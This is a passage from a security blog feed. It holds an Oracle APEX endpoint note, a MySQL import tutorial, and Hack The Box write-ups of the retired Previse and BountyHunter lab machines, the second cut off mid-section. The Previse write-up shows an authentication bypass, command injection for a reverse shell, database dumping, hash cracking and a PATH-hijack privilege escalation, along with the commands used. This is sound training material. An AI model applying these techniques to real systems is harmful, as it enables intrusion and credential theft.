inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-16.42.22.png 2068w" sizes="(min-width: 720px) 720px"></figure><p>Finally, I created a <strong>Handler</strong> for this template:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-14.19.13.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="1734" height="772" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-14.19.13.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-14.19.13.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/05/Screenshot-2022-05-07-at-14.19.13.png 1600w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-14.19.13.png 1734w" sizes="(min-width: 720px) 720px"></figure><p>The most important part of the handler configuration is the <code>PL/SQL</code> block. I used the script shown below to insert the data received in the request into the <code>CONTACT_REQUEST</code> table, and define a <code>status</code> variable with value <code>201</code>, which is the success status code:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-15.27.12.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="1326" height="438" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-15.27.12.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-15.27.12.png 1000w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-15.27.12.png 1326w" sizes="(min-width: 720px) 720px"></figure><p>In order for the status code to be returned, I also needed to add the <code>X-APEX-STATUS-CODE</code> header configuration at the bottom of the page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-15.28.40.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="2000" height="313" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-15.28.40.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-15.28.40.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/05/Screenshot-2022-05-07-at-15.28.40.png 1600w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-15.28.40.png 2070w" sizes="(min-width: 1200px) 1200px"></figure><p>In just a couple of minutes, I had my new endpoint:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-16.44.00.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="1492" height="758" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-16.44.00.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-16.44.00.png 1000w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-16.44.00.png 1492w" sizes="(min-width: 720px) 720px"></figure><p>And as you can see the data is added to the new database, as expected:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-15.32.56.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="2000" height="424" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-15.32.56.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-15.32.56.png 1000w, inesmartins.github.io/content/images/size/w1600/2022/05/Screenshot-2022-05-07-at-15.32.56.png 1600w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-15.32.56.png 2068w" sizes="(min-width: 1200px) 1200px"></figure><h2 id="this-looks-very-spammable">This looks very spammable</h2><p>It is.</p><p>From what I could find, <strong>APEX doesn&apos;t support rate limiting</strong>, so there&apos;s not much else I can do to prevent someone from finding this endpoint and spamming it for fun.</p><p>Since the client is communicating directly with APEX, I can&apos;t think of any alternative way to throttle requests.</p><p>Finally, if you&apos;ve been paying attention I&apos;ve been obscuring the sub-directory that APEX assigned for my organisation, which was based on the &quot;schema&quot; that I set at the start of this process.</p><p>This means that a simple Google Dork may allow you to <strong>enumerate all endpoints of this type</strong>, and most likely find many that don&apos;t enforce authorisation, either on purpose (which is the case here), or by mistake.</p><p>In fact, the <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/oracle.txt">oracle.txt SecList</a> already has some popular name-patterns.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-17.23.05.png" class="kg-image" alt="Creating a very spammable endpoint with Oracle APEX Restful Services" loading="lazy" width="1506" height="1332" srcset="inesmartins.github.io/content/images/size/w600/2022/05/Screenshot-2022-05-07-at-17.23.05.png 600w, inesmartins.github.io/content/images/size/w1000/2022/05/Screenshot-2022-05-07-at-17.23.05.png 1000w, inesmartins.github.io/content/images/2022/05/Screenshot-2022-05-07-at-17.23.05.png 1506w" sizes="(min-width: 720px) 720px"></figure><p>Have fun &#x1F609;</p>]]></content:encoded></item><item><title><![CDATA[How to import mySQL data into Oracle APEX (the hard way)]]></title><description><![CDATA[<blockquote>Oracle Application Express (APEX) is a low-code development platform that enables you to build scalable, secure enterprise apps, with world-class features, that can be deployed anywhere.</blockquote><p>Recently I was asked to import a <code>mySQL</code> database into <a href="https://apex.oracle.com/en/">APEX</a>. </p><p>Although support for <code>mySQL</code> databases is on <a href="https://apex.oracle.com/en/learn/resources/roadmap/">the roadmap</a>, it seems like for</p>]]></description><link>inesmartins.github.io/how-to-import-mysql-data-into-orable-apex/</link><guid isPermaLink="false">62345300d262e33a24f282d8</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 18 Mar 2022 10:16:10 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2022/05/channels4_profile.jpeg" medium="image"/><content:encoded><![CDATA[<blockquote>Oracle Application Express (APEX) is a low-code development platform that enables you to build scalable, secure enterprise apps, with world-class features, that can be deployed anywhere.</blockquote><img src="inesmartins.github.io/content/images/2022/05/channels4_profile.jpeg" alt="How to import mySQL data into Oracle APEX (the hard way)"><p>Recently I was asked to import a <code>mySQL</code> database into <a href="https://apex.oracle.com/en/">APEX</a>. </p><p>Although support for <code>mySQL</code> databases is on <a href="https://apex.oracle.com/en/learn/resources/roadmap/">the roadmap</a>, it seems like for now there&apos;s no straightforward way to import this data ... so here&apos;s a tutorial on how to do it the <em>hard way</em>.</p><p>Under &quot;SQL Workshop&quot; &gt; &quot;Utilities&quot; &gt; &quot;Data Workshop&quot; you can see that there&apos;s a feature that allows you to load data in multiple formats, including <code>csv</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-18-at-09.48.45.png" class="kg-image" alt="How to import mySQL data into Oracle APEX (the hard way)" loading="lazy"></figure><p>So, I decided to create a Python script to grab the data from each of the tables in the <code>mySQL</code> database and export it as an individual <code>csv</code> file:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/ba54cdd6eadb608ec10744535e1dde77.js"></script><!--kg-card-end: html--><p> In order to run this script, make sure to install <a href="https://pypi.org/project/mysql-connector-python/">mysql-connector-python</a>:</p><pre><code class="language-prettyprint lang-sh">~ python3 -m pip install mysql-connector-python</code></pre><p>Then, you can simply run:</p><pre><code class="language-prettyprint lang-sh">~ python3 mysql-to-csv.py</code></pre><p>By the end, you should have a directory full of <code>csv</code> files which you can import, as such:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-18-at-09.56.57-1.png" class="kg-image" alt="How to import mySQL data into Oracle APEX (the hard way)" loading="lazy"></figure><p>Note that you can only load one file at a time, and you also need to manually add the table&apos;s name.</p><p>Once you&apos;re done with importing the data you can go to &quot;SQL Workshop&quot; &gt; &quot;Object Browser&quot; and see all of your tables, which you can then modify as needed:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-18-at-09.59.39-1.png" class="kg-image" alt="How to import mySQL data into Oracle APEX (the hard way)" loading="lazy" width="1440" height="689" srcset="inesmartins.github.io/content/images/size/w600/2022/03/Screenshot-2022-03-18-at-09.59.39-1.png 600w, inesmartins.github.io/content/images/size/w1000/2022/03/Screenshot-2022-03-18-at-09.59.39-1.png 1000w, inesmartins.github.io/content/images/2022/03/Screenshot-2022-03-18-at-09.59.39-1.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Unfortunately, using this method you also need to <strong>add all of the constraints</strong> by hand.</p><p>I&apos;m sure there is a better way to do this, but in the meanwhile here&apos;s a bad workaround, hope it helps!</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Previse]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.com/home/machines/profile/373">here</a>.</em></p><hr><h2 id="scanning">Scanning</h2><p>As always, we start by mapping the <code>previse.htb</code> hostname to the given IP: </p><pre><code class="language-prettyprint lang-sh">~ sudo nano /etc/hosts

10.10.11.104  previse.htb</code></pre><p>The <code>nmap</code> scan is pretty boring, it seems there&apos;s a web server running on port <code>80</code> and</p>]]></description><link>inesmartins.github.io/htb-write-up-previse/</link><guid isPermaLink="false">61d17eafa85f99e081fdd052</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 21 Jan 2022 11:04:08 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-05-at-15.03.17.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-05-at-15.03.17.png" alt="HTB Write-up | Previse"><p><em>Retired machine can be found <a href="https://www.hackthebox.com/home/machines/profile/373">here</a>.</em></p><hr><h2 id="scanning">Scanning</h2><p>As always, we start by mapping the <code>previse.htb</code> hostname to the given IP: </p><pre><code class="language-prettyprint lang-sh">~ sudo nano /etc/hosts

10.10.11.104  previse.htb</code></pre><p>The <code>nmap</code> scan is pretty boring, it seems there&apos;s a web server running on port <code>80</code> and an SSH server on port <code>22</code>:</p><pre><code class="language-prettyprint lang-sh">~ nmap 10.10.11.104

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

~  nmap 10.10.11.104 -sC -sV -A -p 22,80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Previse Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><h2 id="enumeration">Enumeration</h2><p>When we access <a href="http://previse.htb">previse.htb</a> we&apos;re redirected to the login page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-10.32.16.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy"></figure><p>Let&apos;s try to enumerate some directories and files with <code>gobuster</code>:</p><pre><code class="language-prettyprint lang-sh">~ gobuster dir \
-u http://previse.htb \
-c PHPSESSID=r989gcoqshohp5v8thvcji2sh2 \
-x php \
-w ../seclists/big.txt \   
-s 200 -b 403,404 --wildcard

[...]

/accounts.php         (Status: 302) [Size: 3994] [--&gt; login.php]
/config.php           (Status: 200) [Size: 0]                   
/css                  (Status: 301) [Size: 308] [--&gt; http://previse.htb/css/]
/download.php         (Status: 302) [Size: 0] [--&gt; login.php]                
/favicon.ico          (Status: 200) [Size: 15406]                            
/files.php            (Status: 302) [Size: 8377] [--&gt; login.php]             
/footer.php           (Status: 200) [Size: 217]                              
/header.php           (Status: 200) [Size: 980]                              
/index.php            (Status: 302) [Size: 2801] [--&gt; login.php]             
/js                   (Status: 301) [Size: 307] [--&gt; http://previse.htb/js/] 
/login.php            (Status: 200) [Size: 2224]                             
/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]                
/logs.php             (Status: 302) [Size: 0] [--&gt; login.php]
/nav.php              (Status: 200) [Size: 1248]
/status.php           (Status: 302) [Size: 2970] [--&gt; login.php] </code></pre><p>All of the pages either redirect to <code>login.php</code> or have no interesting content, except for the <code>nav.php</code> which has some interesting links:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-10.39.37.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy"></figure><p>The links are:</p><ul><li>Home: <code>/index.php</code></li><li>Accounts + Create Account: <code>/accounts.php</code></li><li>Files: <code>/files.php</code></li><li>Management Menu + Website Status: <code>/status.php</code></li><li>Log data: <code>/file_logs.php</code></li></ul><p>... but they all redirect to <code>login.php</code> since we&apos;re not authenticated.</p><h2 id="bypassing-authentication">Bypassing Authentication</h2><p>The <code>accounts.php</code> page seems the most interesting, maybe we can try some other HTTP methods:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.24.01.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy"></figure><p>Using this <code>POST</code> request we can create a new user and then use these creds to log in:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.24.38.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="1440" height="427" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.24.38.png 600w, inesmartins.github.io/content/images/size/w1000/2022/01/Screenshot-2022-01-02-at-11.24.38.png 1000w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.24.38.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><h2 id="exploring-the-website">Exploring the website</h2><p>On the <code>files.php</code> page there are clearly some attempts to upload reverse shells, as well as a <code>zip</code> file that contains the site backup:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.25.33.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="1440" height="686" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.25.33.png 600w, inesmartins.github.io/content/images/size/w1000/2022/01/Screenshot-2022-01-02-at-11.25.33.png 1000w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.25.33.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>In the backup we can see that the <code>config.php</code> file contains the DB credentials:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.27.06.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="650" height="366" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.27.06.png 600w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.27.06.png 650w"></figure><p>But the <code>logs.php</code> has the most potential, since there&apos;s a call to an <code>exec</code> function that uses a parameter sent via <code>POST</code> request:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.29.44.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="891" height="582" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-02-at-11.29.44.png 600w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-02-at-11.29.44.png 891w"></figure><p>We already know the format of this <code>POST</code> request since it&apos;s the one performed on the <code>file_logs.php</code> page:</p><pre><code class="language-prettyprint lang-sh">POST /logs.php HTTP/1.1
Host: previse.htb
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: http://previse.htb
Connection: close
Referer: http://previse.htb/file_logs.php
Cookie: PHPSESSID=prod44vfotfs0nvgir215458f0
Upgrade-Insecure-Requests: 1

delim=tab</code></pre><p>When we change this <code>delim</code> parameter to send a <code>curl</code> request to a simple local web server we get a ping back!</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-04-at-13.29.05.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy" width="1440" height="583" srcset="inesmartins.github.io/content/images/size/w600/2022/01/Screenshot-2022-01-04-at-13.29.05.png 600w, inesmartins.github.io/content/images/size/w1000/2022/01/Screenshot-2022-01-04-at-13.29.05.png 1000w, inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-04-at-13.29.05.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>So, let&apos;s go for the reverse shell:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2022/01/Screenshot-2022-01-04-at-13.31.37.png" class="kg-image" alt="HTB Write-up | Previse" loading="lazy"></figure><p>We&apos;re in!</p><hr><h2 id="becoming-m4lwhere">Becoming m4lwhere</h2><p>First order of business: upgrade the shell!</p><pre><code class="language-prettyprint lang-python">~ python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><p>Let&apos;s see what else is there:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
m4lwhere:x:1000:1000:m4lwhere:/home/m4lwhere:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false</code></pre><p>We have access to <code>m4lwhere</code>&apos;s home directory, but not to the user flag:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ cd /home/m4lwhere

bash-4.4$ ls
user.txt

bash-4.4$ cat user.txt
cat: user.txt: Permission denied</code></pre><p>Let&apos;s dump the database, since we already have the creds:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ mysqldump -u root -p --all-databases &gt; db_dump.sql

Enter password: mySQL_p@ssw0rd!:)</code></pre><p>There&apos;s a hashed password for the <code>m4lwhere</code> user on the <code>accounts</code> table:</p><pre><code class="language-prettyprint lang-sql">CREATE TABLE `accounts` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `created_at` datetime DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;

INSERT INTO `accounts` VALUES 
(1,&apos;m4lwhere&apos;,&apos;$1$&#xF0;&#x178;&#xA7;&#x201A;llol$DQpmdvnb7EeuO6UaqRItf.&apos;,&apos;2021-05-27 18:18:36&apos;),
[...]</code></pre><p>Save me <code>hashcat</code>!</p><pre><code class="language-prettyprint lang-sh">~ nano hash

$1$&#x1F9C2;llol$DQpmdvnb7EeuO6UaqRItf.

~ hashcat -a 0 -m 500 hash ../seclists/pwds/rockyou.txt --show
$1$&#x1F9C2;llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!</code></pre><p>We got the password!</p><pre><code class="language-prettyprint lang-sh">~ ssh m4lwhere@previse.htb

m4lwhere@previse.htb&apos;s password: 
&gt; ilovecody112235!

[...]

bash-4.4$ cat user.txt 
cff266072b891cf5458d490516040d5b</code></pre><hr><h2 id="road-to-root">Road to root</h2><p>After some poking around I went back to the <code>/opt/script</code> directory:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ cd /opt/scripts/

bash-4.4$ ls -la
total 16
drwxr-xr-x 2 root     root     4096 Jul 26 18:41 .
drwxr-xr-x 3 root     root     4096 Jul 26 18:41 ..
-rwxr-xr-x 1 root     root      486 Jun  6  2021 access_backup.sh
-rw-r--r-- 1 m4lwhere m4lwhere  320 Jun  6  2021 log_process.py</code></pre><p>The <code>access_backup.sh</code> file looks very interesting:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ cat access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we&apos;ll fix it later when there&apos;s time

gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz</code></pre><p>OK, what if we poison the <code>gzip</code> binary:</p><pre><code class="language-prettyprint lang-bsh">bash-4.4$ which gzip
/bin/gzip

bash-4.4$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

bash-4.4$ echo &quot;rm /tmp/pwd&quot; &gt; /tmp/gzip
bash-4.4$ chmod 777 /tmp/gzip 
bash-4.4$ export PATH=/tmp:$PATH
bash-4.4$ cd /opt/scripts/
bash-4.4$ sudo ./access_backup.sh 
&gt; ilovecody112235!
bash-4.4$ cat /tmp/pwd 
b3ca53edb5aecbbc2cd1456f3454cb47</code></pre><p>We&apos;re done babyyyyy!</p><hr>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | BountyHunter]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/359">here</a>.</em></p><hr><h2 id="scanning">Scanning</h2><p>Like with most HTB machines, a quick scan only disclosed <code>SSH</code> running on port <code>22</code> and a web server running on port <code>80</code>:</p><pre><code class="language-prettyprint lang-sh">~ nmap 10.10.11.100

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

~ nmap 10.10.11.</code></pre>]]></description><link>inesmartins.github.io/htb-write-up-bountyhunter/</link><guid isPermaLink="false">613e61d1ca603212098f67b8</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Mon, 29 Nov 2021 23:14:17 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.14.19.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/12/Screenshot-2021-12-31-at-11.14.19.png" alt="HTB Write-up | BountyHunter"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/359">here</a>.</em></p><hr><h2 id="scanning">Scanning</h2><p>Like with most HTB machines, a quick scan only disclosed <code>SSH</code> running on port <code>22</code> and a web server running on port <code>80</code>:</p><pre><code class="language-prettyprint lang-sh">~ nmap 10.10.11.100

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

~ nmap 10.10.11.100 -sC -sV -A -p 22,80

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters</code></pre><p>The website seems to be the corporate page for &quot;The B Team&quot;: they&apos;re bounty hunters, security researchers, and can also use Burp ... impressive stuff.</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.27.46.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy" width="1440" height="732" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.27.46.png 600w, inesmartins.github.io/content/images/size/w1000/2021/09/Screenshot-2021-09-12-at-21.27.46.png 1000w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.27.46.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>The &quot;Portal&quot; link sends us to a <code>portal.php</code> page, which itself links to a page that contains &quot;the bounty tracker&quot; - note that the portal itself is &quot;under development&quot;:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.28.45.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy" width="1440" height="358" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.28.45.png 600w, inesmartins.github.io/content/images/size/w1000/2021/09/Screenshot-2021-09-12-at-21.28.45.png 1000w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.28.45.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>The &quot;bounty tracker&quot; aka the &quot;Bounty Report System&quot; is hosted at <code>/log_submit.php</code> and is still in beta:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.29.09.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy" width="1260" height="281" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.29.09.png 600w, inesmartins.github.io/content/images/size/w1000/2021/09/Screenshot-2021-09-12-at-21.29.09.png 1000w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.29.09.png 1260w" sizes="(min-width: 1200px) 1200px"></figure><p>We&apos;re also able to navigate the <code>/resources</code> directory, which contains some interesting files:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.35.05.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy"></figure><p>The most interesting, at first glance, seems to be this note:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.33.58.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy"></figure><p>A lot to unpack here:</p><ul><li>there&apos;s a <code>test</code> account on the portal that supports <code>nopass</code>;</li><li>we should probably take a look at the &quot;tracker submit script&quot;;</li><li>this script is not yet connected to a DB;</li><li>there&apos;s a <code>developer</code> group somewhere, that used to have too many permissions.</li></ul><p>Running <code>nikto</code> we also found a <code>db.php</code> file:</p><pre><code class="language-prettyprint lang-sh">~ nikto -host 10.10.11.100
...
OSVDB-3093: /db.php: This might be interesting... has been seen in web logs from an unknown scanner.</code></pre><p>And indeed, unlike other random (non-existing) files, this one doesn&apos;t return <code>404</code>, but also doesn&apos;t return any data.</p><hr><h2 id="xxe-to-lfi">XXE to LFI</h2><p>The <code>/resources/bountylog.js</code> file seems to be the aforementioned &quot;tracker submit script&quot;. As you can see below, this script:</p><ul><li>takes the values from the form submitted on the <code>log_submit.php</code> page</li><li>builds an <code>XML</code> string</li><li><code>base64</code>-encodes this data</li><li>sends it to <code>/tracker_diRbPr00f314.php</code> via <code>POST</code> request</li></ul><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.39.13.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy" width="658" height="452" srcset="inesmartins.github.io/content/images/size/w600/2021/09/Screenshot-2021-09-12-at-21.39.13.png 600w, inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.39.13.png 658w"></figure><p>In response, this 